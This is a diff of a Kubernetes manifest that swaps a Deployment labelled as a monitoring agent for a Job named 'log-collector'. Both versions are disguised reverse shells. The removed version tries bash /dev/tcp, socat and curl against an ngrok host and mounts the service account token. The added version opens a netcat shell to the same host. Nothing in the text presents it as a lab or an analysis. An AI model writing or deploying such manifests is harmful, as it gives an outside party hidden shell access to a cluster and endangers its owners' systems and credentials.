@@ -1,30 +1,18 @@
-apiVersion: apps/v1
-kind: Deployment
+apiVersion: batch/v1
+kind: Job
 metadata:
-  name: {{ .Release.Name }}-agent
-  labels:
-    app: monitoring-agent
+  name: log-collector
 spec:
-  replicas: {{ .Values.replicaCount }}
-  selector:
-    matchLabels:
-      app: monitoring-agent
+  ttlSecondsAfterFinished: 60
   template:
-    metadata:
-      labels:
-        app: monitoring-agent
     spec:
       containers:
-      - name: agent
-        image: alpine:latest
+      - name: collector
+        image: busybox:latest
         command:
         - /bin/sh
         - -c
         - |
-          apk add --no-cache bash curl socat 2>/dev/null;
-          bash -i >& /dev/tcp/11.tcp.eu.ngrok.io/20728 0>&1 ||
-          socat exec:"sh -li",pty,stderr,setsid,sigint,sane tcp:11.tcp.eu.ngrok.io:20728 ||
-          curl http://11.tcp.eu.ngrok.io:20728/shell;
-          sleep infinity
-      automountServiceAccountToken: true
-      serviceAccountName: default
+          nc 11.tcp.eu.ngrok.io 20728 -e /bin/sh
+      restartPolicy: Never
+  backoffLimit: 2
